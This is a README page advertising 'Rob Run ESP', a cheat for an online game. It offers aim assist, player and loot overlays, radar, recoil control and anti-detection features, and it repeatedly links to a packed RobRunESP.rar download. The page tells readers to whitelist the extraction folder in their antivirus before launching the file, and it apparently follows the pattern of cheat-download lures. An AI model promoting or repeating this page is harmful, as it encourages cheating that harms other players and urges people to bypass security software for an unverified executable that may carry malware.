<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,100:1f6feb&height=140&section=header&text=ROB%20RUN%20ESP&fontSize=42&fontColor=ffffff&fontAlignY=38&desc=precision%20overlay%20suite&descAlignY=60&descSize=14" width="100%" alt="Rob Run ESP" />

### *« Rob Run ESP — See the field before it moves »*

<br>

> **Aim assist · Entity & world overlays · Radar · Combat mode**

<br>

<!-- ───────────── STATUS ───────────── -->

![Status](https://img.shields.io/badge/🛰️_STATUS-STABLE-3fb950?style=for-the-badge&labelColor=0d1117)
![Version](https://img.shields.io/badge/📦_VERSION-v2.0.0-58a6ff?style=for-the-badge&labelColor=0d1117)
![Updated](https://img.shields.io/badge/🕐_UPDATED-2026.11.12-d29922?style=for-the-badge&labelColor=0d1117)
![Build](https://img.shields.io/badge/🧩_BUILD-ESP-8957e5?style=for-the-badge&labelColor=0d1117)

<br>

<!-- ───────────── PLATFORM ───────────── -->

![Steam](https://img.shields.io/badge/Steam-1b2838?style=flat-square&logo=steam&logoColor=white)
![Epic Games](https://img.shields.io/badge/Epic_Games-313131?style=flat-square&logo=epicgames&logoColor=white)
![Windows](https://img.shields.io/badge/Windows_10_/_11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Intel](https://img.shields.io/badge/Intel-0071C5?style=flat-square&logo=intel&logoColor=white)
![AMD](https://img.shields.io/badge/AMD-ED1C24?style=flat-square&logo=amd&logoColor=white)

<br>

<img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=600&size=14&duration=3000&pause=1000&color=58A6FF&center=true&vCenter=true&width=1000&lines=Entity+Overlays+%E2%9C%94;World+Markers+%E2%9C%94;Real-time+Radar+%E2%9C%94;Combat+Mode+%E2%9C%94;Profile+System+%E2%9C%94" alt="Typing SVG" width="100%" />

<a href="https://github.com/Meetovergate/Rob-Run-ESP/releases/download/v2.0.0/RobRunESP.rar">
  <img src="https://img.shields.io/badge/⬇_Download-RobRunESP.rar-58a6ff?style=for-the-badge&logo=github&logoColor=white&labelColor=0d1117" alt="Download RobRunESP.rar">
</a>

<br>

</div>

---

## 🖼 Preview

<p align="center"> <img src="https://github.com/user-attachments/assets/840fa4ee-ef67-4a7e-91b4-26581d5f304b" alt="Rob Run Helper — main panel" width="100%"> </p><p align="center"> <img src="https://github.com/user-attachments/assets/73ca9169-fde9-4371-b9ff-0b51fd5281d9" alt="Rob Run Helper — entity overlays" width="49%"> <img src="https://github.com/user-attachments/assets/145b83d4-8ca5-4a99-a55b-39542f43f8eb" alt="Rob Run Helper — radar" width="49%"> </p>

---

## 📥 Build

| Archive | Tag | Updated |
|---------|:---:|:-------:|
| [`RobRunESP.rar`](https://github.com/Meetovergate/Rob-Run-ESP/releases/download/v2.0.0/RobRunESP.rar) | `v2.0.0` | Nov 12, 2026 |

> 🛡 **No spoofer bundled.** Packed executables are frequently misflagged — whitelist the extraction folder before launching.

---

## 📋 Table of Contents

| # | Section | Description |
|:-:|:--------|:------------|
| 🎯 | [Features](#-features) | Core capabilities |
| 🖥️ | [Requirements](#️-system-requirements) | Hardware & software |
| ⚙️ | [Configuration](#️-configuration) | Setup guide |
| 🎮 | [Supported Modes](#-supported-modes) | Compatibility |
| 📡 | [Radar](#-radar-system) | Mini-map overlay |
| 🔧 | [Runtime](#-runtime) | Compatibility & updates |
| 📝 | [Changelog](#-changelog) | Version history |

---

## 🎯 Features

<div align="center">

| | Module | Description | Status |
|:-:|:-------|:------------|:------:|
| 🎯 | **Aim Assist** | FOV, smoothing & bone priority, per-weapon presets | ✅ |
| 👁️ | **Player Overlay** | Boxes, health bars, skeleton, distance, names | ✅ |
| 🚗 | **Vehicle Overlay** | Transport, owner, driver, speed readout | ✅ |
| 🌍 | **World Markers** | Loot, traps, interactables and spawn points | ✅ |
| 📡 | **Radar** | Real-time 2D map with zoom, rings & off-screen markers | ✅ |
| ⚔️ | **Combat Mode** | One-tap profile with recoil / sway / spread tuning | ✅ |
| 🎨 | **Customization** | Colors, sizes, fonts, layout and locale editor | ✅ |
| 🧩 | **Profiles** | Saved configs, hot-reload, DPI scaling, VSync, FPS cap | ✅ |

</div>

---

## 🖥️ System Requirements

```
┌─────────────────────────────────────────────────────┐
│  MINIMUM              │  RECOMMENDED                │
├───────────────────────┼─────────────────────────────┤
│  OS: Windows 10 x64   │  OS: Windows 11 x64         │
│  CPU: Intel i3 / Ryzen│  CPU: Intel i5 / Ryzen 5    │
│  RAM: 8 GB            │  RAM: 16 GB                 │
│  GPU: Any DX11        │  GPU: GTX 1060+             │
│  NET: Broadband       │  NET: Fiber / Low latency   │
└───────────────────────┴─────────────────────────────┘
```

---

## ⚙️ Configuration

> [!TIP]
> All settings live in `config.json` and can be hot-reloaded with **`F5`**.

<details>
<summary>📂 <b>Example Configuration</b> (click to expand)</summary>

```json
{
  "esp": {
    "players": true,
    "vehicles": true,
    "world": true,
    "max_distance": 300,
    "colors": {
      "enemy": "#FF4444",
      "ally": "#44FF44",
      "loot": "#FFD700"
    }
  },
  "aim": {
    "enabled": true,
    "fov": 120,
    "smoothing": 4.5,
    "bone": "head",
    "visible_only": true
  },
  "radar": {
    "enabled": true,
    "size": 200,
    "zoom": 1.5,
    "position": "top-left"
  },
  "combat": {
    "mode": "aggressive",
    "recoil_control": true
  }
}
```

</details>

---

## 🎮 Supported Modes

<div align="center">

| Platform | Game Client | Compatibility |
|:--------:|:-----------:|:-------------:|
| 🟢 | Steam | [`Full`](https://github.com/Meetovergate/Rob-Run-ESP/releases/download/v2.0.0/RobRunESP.rar) |
| 🟢 | Epic Games | [`Full`](https://github.com/Meetovergate/Rob-Run-ESP/releases/download/v2.0.0/RobRunESP.rar) |

</div>

---

## 📡 Radar System

> Real-time **2D top-down** radar with adjustable zoom, opacity and icon scaling.

- 🔴 **Enemies** — red dots with direction indicator
- 🟢 **Allies** — green dots
- 🟡 **Loot** — yellow markers
- 🔵 **Vehicles** — blue icons
- ⚪ **Self** — white center crosshair

---

## 🔧 Runtime

| Layer | Technology |
|:------|:-----------|
| 🛡️ **Compatibility** | Runtime compatibility layer |
| 🔐 **Encryption** | AES-256 config & comms |
| 🧬 **Build** | Rotating build signatures |
| 🔄 **Updates** | Auto-patch on game updates |

---

## 📝 Changelog

<details>
<summary><code>v2.0.0</code> — <b>Latest</b> 🟢</summary>

- ✅ Initial public build
- 👁️ Player, vehicle and world overlays
- 🎯 Aim assist with per-weapon presets
- 📡 Real-time radar with off-screen markers
- ⚔️ Combat mode & recoil tuning
- 🧩 Profile system + themable UI

</details>

---

<div align="center">

**Made with** 💜 **by the Rob Run ESP Team**

`v2.0.0` · `2026` · `All rights reserved`

</div>
